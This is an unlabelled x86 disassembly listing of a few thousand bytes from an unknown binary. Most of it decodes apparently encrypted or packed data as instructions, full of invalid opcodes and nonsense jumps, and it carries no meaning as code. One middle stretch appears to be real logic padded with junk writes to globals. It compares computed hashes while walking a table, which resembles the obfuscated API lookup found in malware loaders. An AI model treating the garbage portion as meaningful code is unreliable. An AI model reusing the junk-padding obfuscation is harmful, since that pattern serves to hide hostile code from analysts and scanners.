  40a89b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a89c:	mov    eax,0x7cce135b
  40a8a1:	addr16 popf 
  40a8a3:	add    cl,BYTE PTR [esi+0x412c25d0]
  40a8a9:	jns    0x40a8ff
  40a8ab:	out    dx,eax
  40a8ac:	add    DWORD PTR [ecx],0x5a
  40a8af:	iret   
  40a8b0:	lea    edx,[edx+0x18]
  40a8b3:	inc    esp
  40a8b4:	dec    edi
  40a8b5:	mov    edx,0x7540ef65
  40a8ba:	(bad)  
  40a8bb:	or     DWORD PTR [ebx-0x3fe87695],ecx
  40a8c1:	test   al,0x38
  40a8c3:	fwait
  40a8c4:	pop    es
  40a8c5:	leave  
  40a8c6:	jle    0x40a84f
  40a8c8:	mov    cl,0x25
  40a8ca:	add    esi,DWORD PTR [ecx+0x168e1f47]
  40a8d0:	sar    BYTE PTR [eax-0x61],0x3
  40a8d4:	mov    dh,0x51
  40a8d6:	pop    ds
  40a8d7:	and    DWORD PTR [ecx-0x48],esi
  40a8da:	mov    BYTE PTR [ecx],0x5a
  40a8dd:	loop   0x40a8b7
  40a8df:	out    0x8b,eax
  40a8e1:	call   0x3cc3:0x8cc3d129
  40a8e8:	leave  
  40a8e9:	add    al,BYTE PTR [ebp+0x4c]
  40a8ec:	jp     0x40a8a8
  40a8ee:	rol    BYTE PTR [edx+0x5c28c8f4],1
  40a8f4:	test   al,0x50
  40a8f6:	push   ds
  40a8f7:	mov    cl,0x6b
  40a8f9:	retf   0x4f7f
  40a8fc:	int3   
  40a8fd:	stos   BYTE PTR es:[edi],al
  40a8fe:	shl    DWORD PTR ds:0xfc04b169,cl
  40a904:	pop    di
  40a906:	pop    esp
  40a907:	mov    ebp,0xb479cfbf
  40a90c:	pop    es
  40a90d:	adc    al,0x1e
  40a90f:	cli    
  40a910:	inc    esi
  40a911:	test   BYTE PTR [ecx],cl
  40a913:	jmp    0x40a8dc
  40a915:	xlat   BYTE PTR ds:[ebx]
  40a916:	sbb    DWORD PTR [edx-0x3a],edx
  40a919:	mov    ebx,ebp
  40a91b:	fcmovne st,st(6)
  40a91d:	fcmovu st,st(3)
  40a91f:	push   eax
  40a920:	sbb    eax,DWORD PTR [ebp-0x2cbfb347]
  40a926:	jle    0x40a97d
  40a928:	(bad)  
  40a929:	retf   
  40a92a:	xchg   edi,eax
  40a92b:	sub    ecx,eax
  40a92d:	mov    eax,0x1b489363
  40a932:	test   DWORD PTR [ecx],esi
  40a934:	mov    cl,0x71
  40a936:	and    dl,al
  40a938:	pop    eax
  40a939:	jge    0x40a90d
  40a93b:	ins    DWORD PTR es:[edi],dx
  40a93c:	(bad)  
  40a93e:	aas    
  40a93f:	shr    ah,cl
  40a941:	jmp    FWORD PTR [edi-0x5beecb9]
  40a947:	jg     0x40a8e8
  40a949:	js     0x40a956
  40a94b:	pop    ecx
  40a94c:	or     eax,DWORD PTR [ecx+ebx*4]
  40a94f:	das    
  40a950:	daa    
  40a951:	ret    0xa8f1
  40a954:	and    eax,0xca3a43b4
  40a959:	sbb    al,0xf
  40a95b:	and    al,BYTE PTR [esp+eiz*8-0xe7f63a5]
  40a962:	iret   
  40a963:	xchg   edi,eax
  40a964:	sbb    al,0x82
  40a966:	cs jnp 0x40a9a1
  40a969:	rcr    esi,0x8d
  40a96c:	and    al,0xa8
  40a96e:	inc    edi
  40a96f:	aaa    
  40a970:	ficomp DWORD PTR [esi+0x3892d61d]
  40a976:	(bad)  
  40a977:	loop   0x40a9a1
  40a979:	sub    eax,0xeba05cf1
  40a97e:	(bad)  
  40a97f:	adc    eax,0xbbfaedb9
  40a984:	xlat   BYTE PTR ds:[ebx]
  40a985:	mov    dh,0x3
  40a987:	clc    
  40a988:	(bad)
  40a98b:	mov    bl,0xd4
  40a98d:	stos   DWORD PTR es:[edi],eax
  40a98e:	ins    DWORD PTR es:[edi],dx
  40a98f:	push   edi
  40a990:	outs   dx,BYTE PTR ds:[esi]
  40a991:	sub    eax,0xce286b6a
  40a996:	aad    0x62
  40a998:	push   ebp
  40a999:	fsub   DWORD PTR [ebx-0x3a]
  40a99c:	sbb    BYTE PTR [esi-0xd09a81a],dh
  40a9a2:	push   0x21a318c6
  40a9a7:	add    DWORD PTR [esi+0x15],eax
  40a9aa:	dec    esp
  40a9ab:	xchg   edx,eax
  40a9ac:	sbb    DWORD PTR [esi-0x10],ebx
  40a9af:	and    BYTE PTR [ebx],dh
  40a9b1:	add    edx,DWORD PTR [ebp+esi*8+0x5d17eb81]
  40a9b8:	test   DWORD PTR [ecx],edi
  40a9ba:	gs mov eax,0x6c303434
  40a9c0:	test   DWORD PTR [edx+0x34],ebx
  40a9c3:	dec    eax
  40a9c4:	jg     0x40a9c0
  40a9c6:	mov    cl,0x43
  40a9c8:	in     al,0x12
  40a9ca:	fld    TBYTE PTR [edx]
  40a9cc:	(bad)  
  40a9cd:	sahf   
  40a9ce:	sub    BYTE PTR [ecx],al
  40a9d0:	xor    BYTE PTR [edx],dh
  40a9d2:	add    BYTE PTR [edi+0x52edf667],al
  40a9d8:	jne    0x40aa58
  40a9da:	and    DWORD PTR [eiz*8-0x53db0fe8],ebp
  40a9e1:	sub    bl,bh
  40a9e3:	jne    0x40aa5d
  40a9e5:	inc    edx
  40a9e6:	mov    eax,0xed6da6f6
  40a9eb:	pushf  
  40a9ec:	mov    cl,0xba
  40a9ee:	mov    bl,0xd1
  40a9f0:	xchg   edx,eax
  40a9f1:	cdq    
  40a9f2:	xchg   BYTE PTR [edx],ch
  40a9f4:	xchg   ecx,eax
  40a9f5:	push   esp
  40a9f6:	sbb    BYTE PTR [ebx],al
  40a9f8:	fs scas eax,DWORD PTR es:[edi]
  40a9fa:	push   esi
  40a9fb:	and    ecx,0x1a34a9ae
  40aa01:	out    dx,eax
  40aa02:	imul   ecx,DWORD PTR [ebx],0x6
  40aa05:	rcr    DWORD PTR ds:0x8721f32b,cl
  40aa0b:	int3   
  40aa0c:	scas   al,BYTE PTR es:[edi]
  40aa0d:	stc    
  40aa0e:	sub    eax,0x937245b9
  40aa13:	adc    ebx,DWORD PTR [esi]
  40aa15:	jge    0x40a9f2
  40aa17:	loopne 0x40a9e9
  40aa19:	mov    BYTE PTR [ebx+0x76d6650e],bl
  40aa1f:	cmp    al,0x4
  40aa21:	jecxz  0x40a9a5
  40aa23:	cmc    
  40aa24:	fld    DWORD PTR [esi+0x4c]
  40aa27:	push   esi
  40aa28:	scas   al,BYTE PTR es:[edi]
  40aa29:	fsubr  DWORD PTR [esi]
  40aa2b:	(bad)
  40aa2f:	dec    eax
  40aa30:	mov    eax,0x10561330
  40aa35:	push   eax
  40aa36:	lock lods al,BYTE PTR ds:[esi]
  40aa38:	aad    0xfc
  40aa3a:	sub    eax,0xc78c5acb
  40aa3f:	and    DWORD PTR [edi],esp
  40aa41:	add    ah,BYTE PTR [ebx]
  40aa43:	(bad)  
  40aa44:	fistp  QWORD PTR [edi-0x6b750c28]
  40aa4a:	ficom  WORD PTR [ebx]
  40aa4c:	add    al,0x90
  40aa4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa4f:	add    al,bh
  40aa51:	dec    ebx
  40aa52:	mov    bl,0xd5
  40aa54:	repz mov dh,0xf8
  40aa57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa58:	ds or  cl,dh
  40aa5b:	jecxz  0x40aa63
  40aa5d:	jmp    0x1a00:0x62c5a211
  40aa64:	or     BYTE PTR [eax+0x52],bh
  40aa67:	mov    ecx,0x894304cb
  40aa6c:	pop    ds
  40aa6d:	mov    WORD PTR [edx+eiz*1+0x3b],ds
  40aa71:	jl     0x40aa61
  40aa73:	nop
  40aa74:	data16 (bad) 
  40aa76:	cmp    eax,edx
  40aa78:	out    0xa1,al
  40aa7a:	push   esp
  40aa7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa7c:	adc    eax,0x9b92253f
  40aa81:	(bad)  
  40aa82:	icebp  
  40aa83:	mov    BYTE PTR [ebp+0x1e],dh
  40aa86:	imul   edx,DWORD PTR ss:[ebx-0x1a],0xffffff86
  40aa8b:	(bad)  
  40aa8c:	cmc    
  40aa8d:	jmp    0x7cca696
  40aa92:	or     DWORD PTR [eax+0x32],esp
  40aa95:	adc    ecx,ecx
  40aa97:	nop
  40aa98:	fld    st(2)
  40aa9a:	dec    ebp
  40aa9b:	pop    ecx
  40aa9c:	add    ebp,DWORD PTR [edi]
  40aa9e:	(bad)  
  40aa9f:	out    dx,al
  40aaa0:	dec    ecx
  40aaa1:	cmc    
  40aaa2:	fcom   DWORD PTR [ebx+0x3eb8421]
  40aaa8:	mov    dl,0xed
  40aaaa:	mov    ds:0x896a33d1,eax
  40aaaf:	mov    ecx,0xde2fddc7
  40aab4:	jmp    0xb2fb:0x6c5dcd8a
  40aabb:	fnstsw WORD PTR [ebx+ecx*1]
  40aabe:	je     0x40aa64
  40aac0:	jnp    0x40aaa8
  40aac2:	call   0xe09b:0x40c1eaee
  40aac9:	setae  BYTE PTR [eax-0x6a8634d8]
  40aad0:	mov    DWORD PTR [edi],edi
  40aad2:	outs   dx,DWORD PTR ds:[esi]
  40aad3:	mov    ebp,0x37fc8db9
  40aad8:	cld    
  40aad9:	cmp    BYTE PTR ds:0xc4db2ef9,al
  40aadf:	cmp    al,0xa9
  40aae1:	xor    edi,edi
  40aae3:	sub    cl,ch
  40aae5:	loope  0x40ab2a
  40aae7:	mov    esp,0x85371fd3
  40aaec:	cli    
  40aaed:	stc    
  40aaee:	inc    ecx
  40aaef:	push   edx
  40aaf0:	test   BYTE PTR [edi+0x22],cl
  40aaf3:	mov    ch,0x24
  40aaf5:	inc    ecx
  40aaf6:	js     0x40aa95
  40aaf8:	sahf   
  40aaf9:	(bad)  
  40aafb:	cmp    BYTE PTR [ecx],cl
  40aafd:	adc    DWORD PTR [edi],edi
  40aaff:	or     DWORD PTR [ebx-0x192b5bfc],edi
  40ab05:	enter  0xf694,0x4a
  40ab09:	das    
  40ab0a:	repnz (bad) 
  40ab0d:	dec    esi
  40ab0e:	inc    esi
  40ab0f:	scas   al,BYTE PTR es:[edi]
  40ab10:	arpl   WORD PTR [ebp+0x110f9f67],bx
  40ab16:	pusha  
  40ab17:	jp     0x40aab3
  40ab19:	cmp    edi,eax
  40ab1b:	sub    edx,DWORD PTR [edx-0x59]
  40ab1e:	scas   eax,DWORD PTR es:[edi]
  40ab1f:	ret    
  40ab20:	outs   dx,DWORD PTR ds:[esi]
  40ab21:	inc    BYTE PTR [eax]
  40ab23:	test   BYTE PTR [edx-0x33686fe5],bh
  40ab29:	les    edx,FWORD PTR [ebp-0x7333e59f]
  40ab2f:	in     eax,0x8e
  40ab31:	jg     0x40aab3
  40ab33:	push   ebp
  40ab34:	push   esp
  40ab35:	mov    gs,WORD PTR [eax]
  40ab37:	dec    ecx
  40ab38:	fcom   DWORD PTR [eax-0x13]
  40ab3b:	(bad)  [ebx]
  40ab3d:	daa    
  40ab3e:	outs   dx,DWORD PTR ds:[esi]
  40ab3f:	dec    esi
  40ab40:	xor    ecx,esi
  40ab42:	mov    DWORD PTR ds:0x42a2e6,0x254
  40ab4c:	cmp    ecx,eax
  40ab4e:	je     0x40d111
  40ab54:	mov    eax,DWORD PTR [ebp-0x4]
  40ab57:	and    DWORD PTR ds:0x42a28a,0x5384
  40ab61:	xor    eax,esi
  40ab63:	add    DWORD PTR ds:0x42a2fa,0x7b59
  40ab6d:	add    eax,edi
  40ab6f:	cmp    ebx,eax
  40ab71:	mov    DWORD PTR ds:0x42a2e6,0x2910
  40ab7b:	jne    0x40d0af
  40ab81:	xor    DWORD PTR ds:0x42a276,0x42a2d6
  40ab8b:	push   DWORD PTR [ebp+0x8]
  40ab8e:	call   0x424f10
  40ab93:	and    DWORD PTR ds:0x42a266,edi
  40ab99:	mov    DWORD PTR [ebp-0x14],eax
  40ab9c:	xor    ecx,ecx
  40ab9e:	xor    ecx,DWORD PTR ds:0x42a306
  40aba4:	mov    eax,ds:0x42a3a2
  40aba9:	sub    ecx,eax
  40abab:	or     ecx,DWORD PTR [ecx+eax*1]
  40abae:	mov    eax,DWORD PTR [ebp-0x4]
  40abb1:	sbb    ecx,0x17a4
  40abb7:	mov    ecx,DWORD PTR [ebp-0x14]
  40abba:	xor    DWORD PTR ds:0x42a28a,0x42a2a6
  40abc4:	xor    eax,esi
  40abc6:	add    eax,edi
  40abc8:	mov    DWORD PTR ds:0x42a25a,0x307a
  40abd2:	cmp    ecx,eax
  40abd4:	mov    DWORD PTR ds:0x42a2be,0xd4
  40abde:	je     0x40d1cc
  40abe4:	or     DWORD PTR ds:0x42a2c6,0x42a266
  40abee:	push   DWORD PTR [ebp-0x14]
  40abf1:	not    DWORD PTR ds:0x42a2a6
  40abf7:	push   DWORD PTR [ebp+0x8]
  40abfa:	sbb    DWORD PTR ds:0x42a2ae,0x3b6a
  40ac04:	call   0x424fd0
  40ac09:	mov    DWORD PTR [ebp-0x14],eax
  40ac0c:	or     eax,DWORD PTR ds:0x42a2be
  40ac12:	mov    eax,DWORD PTR [ebp-0x4]
  40ac15:	mov    ecx,DWORD PTR [ebp-0x14]
  40ac18:	xor    eax,esi
  40ac1a:	and    DWORD PTR ds:0x42a2da,0x42a2fe
  40ac24:	add    eax,edi
  40ac26:	cmp    ecx,eax
  40ac28:	mov    DWORD PTR ds:0x42a2d6,0x7d26
  40ac32:	je     0x40d1cc
  40ac38:	xor    ecx,DWORD PTR ds:0x42a2ea
  40ac3e:	mov    eax,DWORD PTR [ebp-0x14]
  40ac41:	mov    eax,DWORD PTR [eax+0x18]
  40ac44:	or     DWORD PTR ds:0x42a29a,0x5e55
  40ac4e:	mov    DWORD PTR [ebp-0x24],eax
  40ac51:	xor    DWORD PTR ds:0x42a2be,ecx
  40ac57:	mov    eax,DWORD PTR [ebp-0x14]
  40ac5a:	and    DWORD PTR ds:0x42a2ee,0x0
  40ac64:	mov    ecx,DWORD PTR ds:0x42a2ee
  40ac6a:	inc    ecx
  40ac6b:	mov    DWORD PTR ds:0x42a2ee,ecx
  40ac71:	cmp    DWORD PTR ds:0x42a2ee,0x1f
  40ac78:	jb     0x40acb0
  40ac7e:	jmp    0x40aca3
  40ac83:	push   DWORD PTR [ebp-0x28]
  40ac86:	push   0x6caa
  40ac8b:	push   0x1820
  40ac90:	push   0x670f
  40ac95:	push   0x3854
  40ac9a:	push   DWORD PTR [ebp-0x24]
  40ac9d:	call   DWORD PTR ds:0x42a3c2
  40aca3:	cmp    DWORD PTR ds:0x42a2ee,0x14
  40acaa:	jb     0x40ac64
  40acb0:	mov    ecx,DWORD PTR [ebp+0x8]
  40acb3:	add    ecx,DWORD PTR [eax+0x20]
  40acb6:	movzx  eax,BYTE PTR ds:0x42a2e6
  40acbd:	adc    DWORD PTR ds:0x42a286,eax
  40acc3:	mov    DWORD PTR [ebp-0x2c],ecx
  40acc6:	adc    DWORD PTR ds:0x42a2b6,ecx
  40accc:	mov    eax,DWORD PTR [ebp-0x14]
  40accf:	sbb    ecx,DWORD PTR ds:0x42a262
  40acd5:	jmp    0x40d063
  40acda:	test   BYTE PTR fs:[esi],bl
  40acdd:	pop    es
  40acde:	sahf   
  40acdf:	and    DWORD PTR [edx-0x80],0x235b4cfa
  40ace6:	(bad)  
  40ace7:	sbb    al,0x48
  40ace9:	push   esi
  40acea:	pop    eax
  40aceb:	lock add DWORD PTR [ebx-0x7c7ca1f4],0x44
  40acf3:	xchg   esp,eax
  40acf4:	out    dx,al
  40acf5:	jmp    0x40ac7f
  40acf7:	and    BYTE PTR [ebx],dh
  40acf9:	or     BYTE PTR ds:0xabf6904d,0x7d
  40ad00:	int3   
  40ad01:	mov    al,0xa4
  40ad03:	add    eax,0x84fb93e8
  40ad08:	pusha  
  40ad09:	xchg   ebp,eax
  40ad0a:	fimul  DWORD PTR [edx-0x68]
  40ad0d:	jo     0x40ad54
  40ad0f:	xor    DWORD PTR [ecx],0x80c2e1b5
  40ad15:	dec    eax
  40ad16:	adc    eax,0x7651cb81
  40ad1b:	(bad)  
  40ad1c:	ds mov dl,0xb6
  40ad1f:	mov    ebx,?
  40ad21:	adc    eax,0x5e842c77
  40ad26:	imul   edx,DWORD PTR ds:0x9fe8c28f,0x1f
  40ad2d:	pushf  
  40ad2e:	fcmovnbe st,st(3)
  40ad30:	mov    gs,WORD PTR [esi-0x6]
  40ad33:	jne    0x40accc
  40ad35:	sbb    BYTE PTR [ebp+0x2b59813f],bh
  40ad3b:	scas   eax,DWORD PTR es:[di]
  40ad3d:	mov    al,0xb2
  40ad3f:	dec    ebp
  40ad40:	int3   
  40ad41:	push   ds
  40ad42:	push   esi
  40ad43:	mov    ah,bh
  40ad45:	cmc    
  40ad46:	adc    ecx,DWORD PTR [eax+0x2c]
  40ad49:	sahf   
  40ad4a:	dec    esi
  40ad4b:	mov    eax,0x3c5906de
  40ad50:	sar    DWORD PTR cs:[esi-0x9],0x67
  40ad55:	sbb    eax,esp
  40ad57:	xchg   edx,eax
  40ad58:	xor    al,bh
  40ad5a:	outs   dx,BYTE PTR ds:[esi]
  40ad5b:	je     0x40ad07
  40ad5d:	cs out 0x5c,eax
  40ad60:	sti    
  40ad61:	sbb    BYTE PTR [edx+ebp*8-0x7d],dh
  40ad65:	lea    esi,[ebx+0x51263a89]
  40ad6b:	icebp  
  40ad6c:	int    0x6b
  40ad6e:	sub    ecx,DWORD PTR [ecx-0x6fc6c607]
  40ad74:	cmp    ch,BYTE PTR [ebx+0x6f]
  40ad77:	fs push ecx
  40ad79:	stc    
  40ad7a:	and    BYTE PTR [esi],0x30
  40ad7d:	out    0x28,eax
  40ad7f:	or     BYTE PTR [ecx+0x6efb273f],ah
  40ad85:	inc    edx
  40ad86:	dec    edx
  40ad87:	mov    dh,ch
  40ad89:	out    0x67,al
  40ad8b:	inc    esi
  40ad8c:	sub    DWORD PTR [ebx+eiz*4],ebx
  40ad8f:	scas   eax,DWORD PTR es:[edi]
  40ad90:	xor    bl,bl
  40ad92:	bound  eax,QWORD PTR [edx-0x4a]
  40ad95:	inc    ebp
  40ad96:	push   edi
  40ad97:	add    BYTE PTR ds:0x13d0ff2a,cl
  40ad9d:	mov    esp,0xf4c2d665
  40ada2:	ins    DWORD PTR es:[edi],dx
  40ada3:	out    dx,al
  40ada4:	addr16 ret 
  40ada6:	xlat   BYTE PTR ds:[ebx]
  40ada7:	and    ch,0x33
  40adaa:	ins    DWORD PTR es:[edi],dx
  40adab:	dec    eax
  40adac:	mov    ecx,0x5cefe3a3
  40adb1:	dec    esp
  40adb2:	pushf  
  40adb3:	aam    0xcc
  40adb5:	inc    edx
  40adb6:	ja     0x40ad70
  40adb8:	shr    DWORD PTR [edi+0x33],cl
  40adbb:	or     ebx,DWORD PTR [eax-0x16]
  40adbe:	jp     0x40ad73
  40adc0:	pop    ecx
  40adc1:	mov    ds:0xc391a3d7,eax
  40adc6:	mov    edi,0xf73c51c1
  40adcb:	mov    ?,WORD PTR [ebp+0x7929ec17]
  40add1:	leave  
  40add2:	lea    eax,[edx]
  40add4:	pushf  
  40add5:	xor    eax,0x51c32119
  40adda:	xor    al,0x74
  40addc:	fmul   QWORD PTR [edi+0x3af18242]
  40ade2:	dec    edx
  40ade3:	pop    esp
  40ade4:	(bad)  [esi-0x6c]
  40ade7:	sub    eax,0x99849e4f
  40adec:	xchg   ebp,eax
  40aded:	rcl    BYTE PTR [edx-0x589572cc],cl
  40adf3:	dec    edx
  40adf4:	ss adc eax,0xa80470f6
  40adfa:	lds    ecx,FWORD PTR [eax-0x784d9016]
  40ae00:	mov    cl,BYTE PTR [edx-0x149eb57]
  40ae06:	pop    ebx
  40ae07:	inc    esi
  40ae08:	stc    
  40ae09:	stc    
  40ae0a:	mul    DWORD PTR [eax-0x70b14131]
  40ae10:	inc    ecx
  40ae11:	test   BYTE PTR [ebx+ebp*2+0x3ba7c0e],dl
  40ae18:	pop    eax
  40ae19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae1a:	sbb    edi,DWORD PTR ds:0x34ab558d
  40ae20:	and    dh,BYTE PTR [ebx-0x66ea4055]
  40ae26:	jmp    0x9bddeffb
  40ae2b:	xchg   DWORD PTR [eax-0x64],ebx
  40ae2e:	adc    ch,BYTE PTR [eax+0x11]
  40ae31:	gs pop es
  40ae33:	cmp    ah,dl
  40ae35:	cmp    al,0xd3
  40ae37:	mov    al,0x1f
  40ae39:	clc    
  40ae3a:	jp     0x40aea7
  40ae3c:	cmp    eax,0xcd1bc72d
  40ae41:	pop    ebx
  40ae42:	repz ds xor cl,ch
  40ae46:	dec    ebx
  40ae47:	jne    0x40ae2e
  40ae49:	and    esi,edi
  40ae4b:	in     al,dx
  40ae4c:	mov    ebp,0xd7ec6aa7
  40ae51:	addr16 and al,0xb1
  40ae54:	sbb    al,0x1d
  40ae56:	daa    
  40ae57:	addr16 inc ebx
  40ae59:	popa   
  40ae5a:	arpl   WORD PTR [esi],bp
  40ae5c:	daa    
  40ae5d:	xchg   edi,eax
  40ae5e:	into   
  40ae5f:	pop    es
  40ae60:	mov    ds,eax
  40ae62:	fidivr WORD PTR [edx]
  40ae64:	xchg   BYTE PTR [ebx],ah
  40ae66:	scas   eax,DWORD PTR es:[edi]
  40ae67:	clc    
  40ae68:	jle    0x40ae1a
  40ae6a:	cmp    ah,0x4d
  40ae6d:	jge    0x40ae15
  40ae6f:	adc    al,0xac
  40ae71:	pop    edi
  40ae72:	mov    WORD PTR [ecx-0x41fe2105],ds
  40ae78:	pusha  
  40ae79:	mov    ah,0xe1
  40ae7b:	fisttp DWORD PTR [ebx+0x24]
  40ae7e:	out    0xb2,al
  40ae80:	inc    esp
  40ae81:	loope  0x40aec6
  40ae83:	shr    BYTE PTR [edx-0x4c],1
  40ae86:	xor    BYTE PTR [ebx],al
  40ae88:	hlt    
  40ae89:	sub    BYTE PTR [edx+edx*1],bl
  40ae8c:	in     eax,0x33
  40ae8e:	jl     0x40aef2
  40ae90:	xlat   BYTE PTR ds:[ebx]
  40ae91:	ss push ecx
  40ae93:	xchg   ch,bl
  40ae95:	adc    ecx,DWORD PTR [eax+0x2b]
  40ae98:	adc    DWORD PTR [ebx+ebx*1-0x584e67d0],edx
  40ae9f:	aaa    
  40aea0:	rcr    BYTE PTR [edi],cl
  40aea2:	mov    cl,0x96
  40aea4:	dec    ebx
  40aea5:	push   ebx
  40aea6:	in     al,dx
  40aea7:	and    al,0x12
  40aea9:	aad    0x5d
  40aeab:	sub    esp,edx
  40aead:	ins    DWORD PTR es:[edi],dx
  40aeae:	test   eax,0x3b6f8cb
  40aeb3:	addr16 mov bl,0xbc
  40aeb6:	mov    esp,0x310d572e
  40aebb:	dec    ebx
  40aebc:	bound  eax,QWORD PTR [edx+0x2b]
  40aebf:	out    dx,eax
  40aec0:	outs   dx,BYTE PTR ds:[esi]
  40aec1:	push   ecx
  40aec2:	mov    ch,0x19
  40aec4:	jg     0x40aebc
  40aec6:	adc    BYTE PTR [ecx+0x113c7f13],bl
  40aecc:	test   al,0xf1
  40aece:	lods   al,BYTE PTR ds:[esi]
  40aecf:	(bad)  
  40aed0:	fld    TBYTE PTR [esi+0x5a6c0481]
  40aed6:	dec    edx
  40aed7:	loope  0x40aef3
  40aed9:	add    DWORD PTR ds:0x5fb0ab2f,edi
  40aedf:	adc    al,BYTE PTR [ebp-0xc]
  40aee2:	(bad)  
  40aee5:	fld1   
  40aee7:	call   eax
  40aee9:	adc    eax,DWORD PTR [esi]
  40aeeb:	repz xchg esp,eax
  40aeed:	int    0x1c
  40aeef:	imul   ebp,DWORD PTR [ebp+0x1f28100b],0xffffffa0
  40aef6:	dec    edi
  40aef7:	add    dl,BYTE PTR [ebx]
  40aef9:	imul   ecx,DWORD PTR [ebp+0x6a],0xdb7d0981
  40af00:	or     dh,0x2e
  40af03:	adc    ebx,DWORD PTR [ebp-0x47124912]
  40af09:	daa    
  40af0a:	repz pusha 
  40af0c:	adc    bl,BYTE PTR [edx+ebp*4+0x2b54d24b]
  40af13:	add    DWORD PTR [esi],ebp
  40af15:	mov    edx,0x84bf013
  40af1a:	add    BYTE PTR [ebp-0x54835cd7],bl
  40af20:	ret    0x6b67
  40af23:	inc    eax
  40af24:	ins    BYTE PTR es:[edi],dx
  40af25:	xor    BYTE PTR [esi-0x27],dh
  40af28:	adc    DWORD PTR [esi],0xfffffff7
  40af2b:	jae    0x40aec1
  40af2d:	jno    0x40aeb5
  40af2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af30:	dec    edi
  40af31:	sti    
  40af32:	adc    al,0xa3
  40af34:	add    al,dh
  40af36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af37:	aas    
  40af38:	ret    0xf05e
  40af3b:	sub    eax,0xd2bfb15e
  40af40:	cdq    
  40af41:	test   DWORD PTR ds:0x38b72dc9,esp
  40af47:	les    eax,FWORD PTR [eax-0x77cd4e7f]
  40af4d:	daa    
  40af4e:	mov    esp,0xcc267fe1
  40af53:	xor    al,0xea
  40af55:	pop    es
  40af56:	into   
  40af57:	push   0xffffffa0
  40af59:	test   al,0x6c
  40af5b:	jnp    0x40af33
  40af5d:	xor    BYTE PTR [ebp+0x49],al
  40af60:	cmp    eax,0x71106aca
  40af65:	rcl    BYTE PTR [edi+edx*4-0x6044e0c0],0x71
  40af6d:	push   esp
  40af6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af6f:	jp     0x40afeb
  40af71:	xchg   esp,eax
  40af72:	je     0x40aefc
  40af74:	into   
  40af75:	stc    
  40af76:	ss in  al,dx
  40af78:	rcl    DWORD PTR [esi-0x54],0x7e
  40af7c:	inc    ecx
  40af7d:	data16 xlat BYTE PTR ds:[ebx]
  40af7f:	stos   BYTE PTR es:[edi],al
  40af80:	adc    BYTE PTR [ebx+ecx*2],dl
  40af83:	outs   dx,BYTE PTR ds:[esi]
  40af84:	mov    ebx,0xd3185d3c
  40af89:	dec    esi
  40af8a:	push   0x3c
  40af8c:	or     eax,0x2943ecf4
  40af91:	cdq    
  40af92:	jge    0x40af9c
  40af94:	mov    esp,0xc96b2f6d
  40af99:	into   
  40af9a:	ja     0x40af9f
  40af9c:	or     ecx,eax
  40af9e:	adc    edi,DWORD PTR [edi+0x53]
  40afa1:	inc    esp
  40afa2:	sbb    esp,DWORD PTR [ecx-0x93d898d]
  40afa8:	icebp  
  40afa9:	mov    BYTE PTR [edx-0x45],bh
  40afac:	mov    ebp,0x631cd97d
  40afb1:	mov    cl,0xa6
  40afb3:	nop
  40afb4:	test   BYTE PTR [edi+0x5c497740],al
  40afba:	add    BYTE PTR [edx-0x6ba427c],0xee
  40afc1:	or     al,0x93
  40afc3:	push   0x4f
  40afc5:	dec    ebp
  40afc6:	loop   0x40af83
  40afc8:	shl    DWORD PTR [ecx-0x1d93b67e],cl
  40afce:	jp     0x40afd9
  40afd0:	push   edx
  40afd1:	rol    DWORD PTR [eax+edx*8-0x578369c1],1
  40afd8:	add    edi,DWORD PTR [esp+ecx*4-0x35cc12f9]
  40afdf:	daa    
  40afe0:	enter  0x98c2,0x6c
  40afe4:	daa    
  40afe5:	xchg   BYTE PTR cs:[ebx+0x42cb0d98],ch
  40afec:	push   ds
  40afed:	int    0xbc
  40afef:	xchg   edx,eax
  40aff0:	cmp    ch,dl
  40aff2:	retf   0xe2bb
  40aff5:	or     BYTE PTR [edx-0x2f],0x57
  40aff9:	cmp    ebp,DWORD PTR [esi+ecx*2-0x4b]
  40affd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40affe:	mov    al,ds:0x9039d18a
  40b003:	mov    ecx,0xb89d1938
  40b008:	sbb    BYTE PTR [ebp-0x70521c2],al
  40b00e:	add    dl,al
  40b010:	pop    ebp
  40b011:	into   
  40b012:	test   al,0x17
  40b014:	or     DWORD PTR [edx-0x1357e3bc],ecx
  40b01a:	int    0xda
  40b01c:	inc    ecx
  40b01d:	jp     0x40b09d
  40b01f:	push   0xb15bf2cb
  40b024:	es call 0x9a97:0x51158893
  40b02c:	pop    es
  40b02d:	mov    esi,0x1f6f797e
  40b032:	xor    BYTE PTR [ebp+0x5c5d0393],dl
  40b038:	sbb    al,0xd4
  40b03a:	call   0x6585c1ac
  40b03f:	xor    DWORD PTR [ebp+0x19],esi
  40b042:	loope  0x40afd0
  40b044:	mov    esi,DWORD PTR [ebx+0x47bb99a7]
  40b04a:	sti    
  40b04b:	call   0x888a33b
  40b050:	(bad)  [esi-0x62549e0f]
  40b056:	into   
  40b057:	cmc    
  40b058:	in     eax,dx
  40b059:	jnp    0x40b079
  40b05b:	jmp    0x5c975197
  40b060:	pusha  
  40b061:	fld    TBYTE PTR [esi]
  40b063:	dec    edx
  40b064:	mov    ah,0x68
  40b066:	int    0x41
  40b068:	push   esp
  40b069:	icebp  
  40b06a:	adc    BYTE PTR [edx-0x77],dl
  40b06d:	jb     0x40b07b
  40b06f:	pop    ebp
  40b070:	rol    BYTE PTR [ecx+0x2d02c6c5],cl
  40b076:	mov    bh,0x6f
  40b078:	or     dh,BYTE PTR [eax]
  40b07a:	ficom  DWORD PTR [edx-0x62d73aec]
  40b080:	popa   
  40b081:	scas   eax,DWORD PTR es:[edi]
  40b082:	stos   BYTE PTR es:[edi],al
  40b083:	sbb    al,0x81
  40b085:	lds    ecx,FWORD PTR [ebx-0xf0be8ee]
  40b08b:	stos   DWORD PTR es:[edi],eax
  40b08c:	rcr    DWORD PTR [edi-0x1a9299d8],1
  40b092:	imul   esi,DWORD PTR [edx-0x6eedd560],0x197b32f6
  40b09c:	je     0x40b02c
  40b09e:	push   ss
  40b09f:	inc    ebp
  40b0a0:	lahf   
